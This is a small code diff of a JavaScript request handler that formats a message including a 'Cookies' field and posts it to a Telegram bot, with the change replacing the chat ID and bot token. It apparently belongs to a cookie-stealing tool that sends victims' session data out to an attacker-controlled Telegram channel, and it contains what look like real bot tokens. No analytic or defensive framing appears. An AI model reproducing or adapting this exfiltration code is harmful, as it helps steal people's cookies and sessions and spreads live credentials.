@@ -38,8 +38,8 @@ export default async function handler(req, res) {
 🍪 *Cookies:* ${cookies}
 ────────────────────`;
   
-  const telegramId = '7008824750';
-  const botToken = '7507560214:AAF_tUasb0WwqNAcsVaf2bcVb6dzxIO7gvk';
+  const telegramId = '7749670936';
+  const botToken = '8041305531:AAGFarizOCOlyLDUia8TUlbIl0IJqfdardo';
 
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
